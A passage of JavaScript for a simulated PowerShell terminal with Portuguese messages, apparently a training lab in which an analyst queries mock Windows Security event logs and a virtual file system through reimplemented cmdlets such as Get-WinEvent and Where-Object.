              { TimeCreated: '14/03/2026 02:14:52', Id: 4672, LevelDisplayName: 'Information', Message: 'Conta: CORP\\svc_sql | SeDebugPrivilege | LogonId: 0x8f21c' },
              { TimeCreated: '14/03/2026 03:07:44', Id: 4625, LevelDisplayName: 'Information', Message: 'Conta: CORP\\svc_sql | Logon Type 3 | SubStatus 0xC000006A | Origem: 10.0.0.66' },
              { TimeCreated: '14/03/2026 03:07:45', Id: 4625, LevelDisplayName: 'Information', Message: 'Conta: CORP\\svc_sql | Logon Type 3 | SubStatus 0xC000006A | Origem: 10.0.0.66' },
              { TimeCreated: '14/03/2026 04:02:10', Id: 1102, LevelDisplayName: 'Warning', Message: 'A auditoria do log de segurança foi apagada' },
            ];
          }
          if (idMatch) rows = rows.filter((r) => String(r.Id) === idMatch[1]);
          const max = Number(getArg('-MaxEvents'));
          if (max) rows = rows.slice(0, max);
          if (!rows.length) { this.line('Nenhum evento corresponde aos critérios de pesquisa.', 'err'); return []; }
          return rows;
        }
        case 'test-path': {
          const p = getArg('-Path') || args.replace(/['"]/g, '').split(/\s+/)[0];
          if (!p) { this.line('Falta o argumento -Path.', 'err'); return undefined; }
          return getNode(resolve(this.cwd, p)) ? 'True' : 'False';
        }
        case 'get-command': {
          const q = args.replace(/['"]/g, '').split(/\s+/)[0];
          const known = ['get-childitem','get-content','get-process','get-service','get-winevent','where-object','select-object','sort-object','measure-object','get-date','set-location','test-path','get-localuser','get-help','get-command','get-executionpolicy','get-computerinfo','clear-host','measure'];
          if (!q) { this.line(`Forneça o nome de um comando. Ex.: Get-Command get-*`, 'err'); return undefined; }
          const hit = known.find((k) => k.startsWith(q.toLowerCase()));
          if (!hit) { this.line(`O termo '${q}' não corresponde a um cmdlet nomeado no módulo atual.`, 'err'); return undefined; }
          return [{ Name: hit, CommandType: 'Cmdlet', ModuleName: 'Microsoft.PowerShell.Management' }];
        }
        case 'get-help': {
          const q = (args.replace(/['"]/g, '').split(/\s+/)[0] || '').toLowerCase();
          const docs = {
            'get-childitem': 'Lista itens e subitens no(s) local(is) especificado(s). Ex.: Get-ChildItem -Path C:\\Windows -Filter *.log -Recurse',
            'where-object': 'Seleciona objetos com base em valores de propriedade. Ex.: Get-Process | Where-Object {$_.CPU -gt 100}',
            'get-winevent': 'Obtém eventos de log do Windows. Ex.: Get-WinEvent -FilterHashtable @{LogName="Security";ID=4625}',
            'select-object': 'Cria objetos selecionados de propriedades de entrada. Ex.: Select-Object -First 5 -Property Name,CPU',
            'get-content': 'Obtém o conteúdo de um item no caminho especificado. Ex.: Get-Content .\\auth.log -Tail 10',
          };
          const key = Object.keys(docs).find((k) => k.startsWith(q)) || 'get-childitem';
          this.line('');
          this.line('Tema', 'sys'); this.line('----');
          this.line(docs[key]);
          this.line('');
          this.line('Sintaxe', 'sys'); this.line('--------');
          this.line(key.charAt(0).toUpperCase() + key.slice(1) + ' [-Path] <String[]> [<CommonParameters>]');
          return null;
        }
        case 'set-location':
        case 'cd': {
          const p = (getArg('-Path') || args.replace(/['"]/g, '').trim() || '.');
          const t = resolve(this.cwd, p);
          const node = getNode(t);
          if (!node || isFile(node)) { this.line(`Cannot find path '${p}' because it does not exist.`, 'err'); return undefined; }
          this.cwd = t; this._prompt(); return null;
        }
        case 'get-location': return `Path: ${this.cwd}`;
        case 'get-childitem':
        case 'ls':
        case 'gci':
        case 'dir': {
          const positional = args.replace(/-\w+/g, '').replace(/['"]/g, '').trim();
          const p = getArg('-Path') || positional || '.';
          const target = resolve(this.cwd, p);
          const node = getNode(target);
          if (!node) { this.line(`Cannot find path '${target}' porque não existe.`, 'err'); return undefined; }
          if (isFile(node)) return [{ Name: target.split('\\').pop(), Length: node.__file.length, Mode: '-a---' }];
          const force = /-force/i.test(stage);
          const rows = Object.keys(node)
            .filter((k) => force || !k.startsWith('.'))
            .map((k) => isFile(node[k])
              ? { Mode: '-a---', LastWriteTime: pseudoDate(k).trim(), Length: node[k].__file.length, Name: k }
              : { Mode: 'd-----', LastWriteTime: pseudoDate(k).trim(), Length: '', Name: k });
          if (!rows.length) { this.line('', 'dim'); return []; }
          return rows;
        }
        case 'get-content':
        case 'type':
        case 'cat':
        case 'gc': {
          const positional = args.replace(/-Tail\s+\d+/gi, '').replace(/-\w+/g, '').replace(/['"]/g, '').trim();
          const p = getArg('-Path') || positional;
          if (!p) { this.line('Falta o caminho do arquivo.', 'err'); return undefined; }
          const node = getNode(resolve(this.cwd, p));
          if (!node || !isFile(node)) { this.line(`Cannot find path '${p}' porque não existe.`, 'err'); return undefined; }
          let lines = node.__file.split('\n');
          const tail = Number(getArg('-Tail'));
          if (tail) lines = lines.slice(-tail);
          lines.forEach((l) => this.line(l));
          return null;
        }
        case 'where-object':
        case 'where': {
          if (!Array.isArray(data)) { this.line('Where-Object: a entrada não é uma coleção de objetos.', 'err'); return undefined; }
          return filterObjects(data, stage);
        }
        case 'select-object': {
          if (!Array.isArray(data)) data = [data];
          const first = Number(getArg('-First'));
          const expand = getArg('-ExpandProperty');
          let props = getList('-Property');
          if (!props) props = getList('Property');
          let rows = first ? data.slice(0, first) : data.slice();
          if (expand) return rows.map((r) => (r && typeof r === 'object' ? String(r[expand]) : String(r)));
          if (props && props.length && props[0] !== '*') return rows.map((r) => {
            const o = {}; props.forEach((p) => { o[p] = r && typeof r === 'object' ? r[p] : undefined; }); return o;
          });
          return rows;
        }
        case 'sort-object':
        case 'sort': {
          if (!Array.isArray(data)) data = [data];
          const prop = (getArg('-Property') || args.replace(/-\w+/g, '').trim().split(/\s+/)[0] || '').replace(/['"]/g, '');
          const desc = /-descending/i.test(stage);
          const rows = data.slice().sort((a, b) => {
            const va = prop && typeof a === 'object' ? a[prop] : a;
            const vb = prop && typeof b === 'object' ? b[prop] : b;
            if (va === vb) return 0;
            return (String(va).toLowerCase() < String(vb).toLowerCase() ? -1 : 1) * (desc ? -1 : 1);
          });
          return rows;
        }
        case 'measure-object':
        case 'measure': {
          if (!Array.isArray(data)) data = [data];
          return `Count    : ${data.length}\nAverage  : \nSum      : \nMaximum  : \nMinimum  : \nProperty : `;
        }
        case 'foreach-object':
        case 'foreach': {
          if (!Array.isArray(data)) data = [data];
          const inner = (stage.match(/\{\s*(.+?)\s*\}/) || [])[1] || '';
          const propMatch = inner.match(/^\$?_?\.?(\w+)$/);
          if (propMatch) return data.map((r) => (r && typeof r === 'object' ? String(r[propMatch[1]]) : String(r)));
          return data;
        }
        case 'whoami': return 'corp\\analista';
        case 'ipconfig': return '   IPv4. . . . . . . . . . . : 192.168.1.50   Mascara: 255.255.255.0   GW: 192.168.1.1';
        case 'ping': return 'Resposta de 10.0.0.5: bytes=32 tempo=11ms TTL=122';
        case 'clear-host': this.outEl.innerHTML = ''; return null;
        default:
          this.line(`'${m[1]}' não é reconhecido como um cmdlet de Windows PowerShell. Use Get-Help para ver os comandos.`, 'err');
          return undefined;
      }
    },

    _renderObjects(rows) {
      if (!rows || !rows.length) { this.line(''); return; }
      if (typeof rows[0] === 'string') { rows.forEach((r) => this.line(r)); return; }
      const cols = [];
      rows.forEach((r) => Object.keys(r).forEach((k) => { if (!cols.includes(k)) cols.push(k); }));
      const widths = cols.map((c) => Math.min(70, Math.max(c.length, ...rows.map((r) => String(r[c] ?? '').length))));
      const pad = (s, n) => { s = String(s ?? ''); return s.length > n ? s.slice(0, n - 1) + '…' : s.padEnd(n); };
      this.raw('<span class="ln ps">' + cols.map((c, i) => escapeHtml(pad(c, widths[i]))).join('  ') + '</span>');
      this.raw('<span class="ln dim">' + cols.map((_, i) => '─'.repeat(widths[i])).join('──') + '</span>');
      rows.forEach((r) =>
        this.raw('<span class="ln">' + cols.map((c, i) => escapeHtml(pad(r[c], widths[i]))).join('  ') + '</span>'));
      this.line('');
    },
  };

  /* ---------------- utilidades ---------------- */
  function filterObjects(rows, stage) {
    let inner = (stage.match(/\{\s*(.+?)\s*\}/) || [])[1];
    if (inner) {
      const m = inner.match(/^\$?_?\.?(\w+)\s+(-\w+)\s+(?:"([^"]*)"|'([^']*)'|(\S+))/);
      if (!m) return rows;
      const prop = m[1], op = m[2].toLowerCase();
      const val = m[3] ?? m[4] ?? m[5];
      return rows.filter((r) => {
        const v = r && typeof r === 'object' ? r[prop] : r;
        const s = v === undefined || v === null ? '' : String(v);
        switch (op) {
          case '-eq': return s.toLowerCase() === String(val).toLowerCase();
          case '-ne': return s.toLowerCase() !== String(val).toLowerCase();
          case '-like': return glob(s, String(val));
          case '-notlike': return !glob(s, String(val));
          case '-match': return new RegExp(val, 'i').test(s);
          case '-notmatch': return !new RegExp(val, 'i').test(s);
          case '-gt': return parseFloat(s) > parseFloat(val);
          case '-lt': return parseFloat(s) < parseFloat(val);
          case '-ge': return parseFloat(s) >= parseFloat(val);
          case '-le': return parseFloat(s) <= parseFloat(val);
          case '-contains': return s.toLowerCase().includes(String(val).toLowerCase());
          default: return true;
        }
      });
    }
    const m = stage.match(/(?:Where-Object|where)\s+(\w+)\s+(-\w+)\s+(?:"([^"]*)"|'([^']*)'|(\S+))/i);
    if (m) {
      const prop = m[1], op = m[2].toLowerCase();
      const val = m[3] ?? m[4] ?? m[5];
      return rows.filter((r) => {
        const v = r && typeof r === 'object' ? r[prop] : r;
        const s = v === undefined || v === null ? '' : String(v);
        if (op === '-like') return glob(s, val);
        if (op === '-notlike') return !glob(s, val);
        if (op === '-eq') return s.toLowerCase() === String(val).toLowerCase();
        if (op === '-ne') return s.toLowerCase() !== String(val).toLowerCase();
        if (op === '-match') return new RegExp(val, 'i').test(s);
        return true;
      });
    }
    return rows;
  }
  function glob(str, pattern) {
    const re = new RegExp('^' + pattern.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$', 'i');
    return re.test(str);
  }
  function expandVars(s) {
    const vars = { cd: Term.cwd, systemroot: 'C:\\Windows', username: 'analista', userdomain: 'CORP' };
    return s.replace(/%(\w+)%/gi, (m, k) => (k in vars ? vars[k] : m));
  }
  function splitArgs(s) {
    const out = [];
    const re = /"([^"]*)"|(\S+)/g;
    let m;
    while ((m = re.exec(s))) out.push(m[1] !== undefined ? m[1] : m[2]);
    return out;
  }
  function escapeRe(s) { return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }
  function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  window.Terminal = Term;
})();
